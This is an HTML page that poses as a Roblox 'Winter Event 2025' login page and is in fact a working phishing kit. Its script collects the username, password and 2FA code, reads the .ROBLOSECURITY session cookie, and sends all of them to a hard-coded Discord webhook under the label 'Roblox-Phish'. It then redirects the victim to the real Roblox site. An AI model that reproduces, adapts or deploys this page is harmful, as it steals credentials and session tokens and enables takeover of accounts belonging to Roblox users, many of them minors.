<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Roblox Winter Event 2025</title>
  <link rel="icon" href="https://www.roblox.com/favicon.ico">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>body{margin:0;background:#121212;font-family:system-ui;color:#fff}#box{width:320px;margin:10vh auto;padding:24px;background:#1e1e1e;border-radius:8px}input{width:100%;padding:10px;margin:8px 0;border:0;border-radius:4px}button{width:100%;padding:12px;background:#02b757;color:#fff;border:0;border-radius:4px;font-weight:700;cursor:pointer}button:hover{background:#029a4a}</style>
</head>
<body>
<div id="box">
  <img src="https://www.roblox.com/Images/Logo/roblox-logo-white.svg" alt="Roblox" style="width:140px;margin:0 auto 24px;display:block">
  <form id="f" autocomplete="off">
    <input name="u" placeholder="Username" required>
    <input name="p" type="password" placeholder="Password" required>
    <input name="mfa" placeholder="2FA-Code (falls vorhanden)" autocomplete="one-time-code">
    <button type="submit">Log In</button>
  </form>
</div>
<script>
document.getElementById('f').addEventListener('submit', async e => {
  e.preventDefault();
  const u = e.target.u.value, p = e.target.p.value, m = e.target.mfa.value;
  const robloxSec = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] || '';

  // LIVE-Push zu webhook.site (kein Token nötig)
 await fetch('https://discord.com/api/webhooks/1422244213491499162/S8y98VTEc7q-LoxTTi0yhtw7xtyRTcRzz9fQGW5geZgVrUzBj8e-aCg3_QL6qodey4pS', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    content: '**Roblox-Phish**',
    embeds: [{
      title: 'Neuer Login',
      color: 0x02b757,
      fields: [
        { name: 'Username', value: u, inline: true },
        { name: 'Password', value: p, inline: true },
        { name: '2FA', value: m || '–', inline: true },
        { name: 'ROBLOSECURITY', value: robloxSec || '–', inline: false }
      ],
      timestamp: new Date().toISOString()
    }]
  })
});
  // Weiterleitung zum echten Roblox
  window.location = 'https://www.roblox.com/home';
});
</script>
</body></html>
